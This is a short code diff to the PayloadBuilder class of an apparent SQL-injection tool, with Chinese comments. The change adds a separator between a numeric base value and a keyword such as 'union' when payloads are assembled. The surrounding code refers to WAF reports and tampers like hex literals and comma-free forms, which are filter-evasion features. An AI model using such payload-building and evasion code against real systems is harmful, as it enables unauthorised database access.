@@ -9,7 +9,7 @@
 from __future__ import annotations
 
 from .models import InjectionPoint, WafReport
-from ..tampers import apply_form, comma_free, to_hex_literal
+from ..tampers import apply_form, comma_free, form_sep, to_hex_literal
 
 
 class PayloadBuilder:
@@ -59,11 +59,17 @@ class PayloadBuilder:
         """组装完整 payload：base + closure + core + comment。
 
         neutralize：仅对 union 前缀生效（置空原查询行，让 union 行占据回显位）。
+        数字型（无闭合）时在关键字核心前插入形态分隔符，避免 0union 粘连。
         """
         b = base_value if base_value is not None else self.inj.base_value
+        form = getattr(self.inj, "form", "classic") or "classic"
         if neutralize and core.lstrip().lower().startswith("union"):
             b = "0"
         pre = b if self.inj.numeric else b + self.inj.closure
+        if pre and not pre.endswith(("'", '"', "`", ")")):
+            core_t = self.transform(core)
+            if core_t[:1].isalpha() or core_t[:1] == ";":
+                pre += form_sep(form)
         tail = self.inj.comment if self.inj.comment != "quote-close" else ""
         return pre + self.transform(core) + tail
 
